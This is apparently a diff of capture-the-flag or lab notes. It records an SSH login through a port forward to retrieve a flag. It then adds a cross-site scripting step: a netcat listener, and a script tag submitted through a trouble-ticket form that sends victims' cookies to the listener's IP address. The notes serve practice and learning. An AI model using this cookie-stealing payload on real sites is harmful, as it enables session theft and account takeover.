@@ -50,3 +50,9 @@ using our ssh port forward we created earlier*
 #ssh billybob@127.0.0.1 -p 11112
 billybob@mi$ cd /home
 #we did dir, revealed romanoff@mi.ru, cd there, cat contracts, flag revealed.
+#For cross-site scripting*
+#Went to a single shell, input
+nc -lvnkp 4444
+#We went to the trouble tickets, and submitted
+<script>document.location="http://10.50.153.201:4444/?username=" + document.cookie;</script>
+#Waited.
